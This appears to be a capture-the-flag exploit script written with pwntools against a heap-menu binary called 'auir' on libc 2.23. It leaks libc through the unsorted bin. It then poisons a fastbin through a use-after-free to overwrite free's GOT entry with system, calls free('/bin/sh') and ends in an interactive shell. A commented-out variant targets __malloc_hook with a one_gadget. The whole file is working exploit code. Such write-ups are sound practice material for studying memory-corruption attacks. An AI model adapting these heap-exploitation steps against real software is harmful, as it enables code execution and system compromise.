from pwn import *

s = process("./auir", env=  {"LD_PRELOAD": "./libc-2.23.so"})
libc = ELF("./libc-2.23.so")

__libc_start_main = 0x000000000605040
heap_ptr = 0x605310
free_got = 0x000000000605060

def make(size, data):
    s.sendlineafter(">>", "1")
    s.sendlineafter(">>", str(size))
    s.sendlineafter(">>", data)

def destroy(index):
    s.sendlineafter(">>", "2")
    s.sendlineafter(">>", str(index))

def fix(index, size, data):
    s.sendlineafter(">>", "3")
    s.sendlineafter(">>", str(index))
    s.sendlineafter(">>", str(size))
    s.sendafter(">>", data)

def display(index):
    s.sendlineafter(">>", "4")
    s.sendlineafter(">>", str(index))

"""
For some reason (might just because of this libc version), every time we allocate 3 chunks like below, then we free chunk 0 (chunk 0 goes in unsorted bin), address of main_arena+88 will always be placed into chunk 0's data section 
=> we can use this to leak libc 
"""
make(240, "AAAAAAA")    # chunk 0       # size of 240 is automatically rounded up to 0x100 for alignment
make(90, "BBBBB")       # chunk 1       # size of 84 is automatically rounded up to 0x60  for alignment

destroy(0)

display(0)
s.recvline()        
leak = s.recvuntil("|")
main_arena_88 = u64(leak[:-1].ljust(8, "\x00"))
libc.address = main_arena_88 - 0x3c4b78
before_malloc = libc.symbols["__malloc_hook"] - 0x23        # choose offset -0x23 to be the start of our fake chunk as the qword for the size of the chunk (which is at -0x23+8) is 0x7f => fits the index of the fastbin in which our allocated chunks are placed 
one_gadget = libc.address + 0x45216
log.info("Libc base: {}".format(hex(libc.address)))


# the algorithm doesn't decrement the index after freeing 
make(90, "2222")    # chunk 2

destroy(2)
fix(2, 18, p64(heap_ptr -0x23) + p64(0x0))

make(90, "3333")    # get back chunk 2
make(90, "A"*0x13 + p64(free_got))     # chunk 3 which is at heap_ptr-0x23 
fix(0, 8, p64(libc.symbols["system"])) # overwrite chunk 0 (which is free_got now) with system 
fix(1, 8, "/bin/sh\x00")
destroy(1)                             # call free("/bin/sh\x00") because free_got is overwritten with system 




"""
payload = "X"*0x13 + p64(one_gadget) + p64(0x0)

destroy(3)          
fix(0, 16, p64(before_malloc) + p64(0x0))  # fake fd pointer for freed chunk 0 

make(100, "0000")    # get back chunk 0 
make(100, payload)
#make(10, "XXXX")
"""
s.interactive()



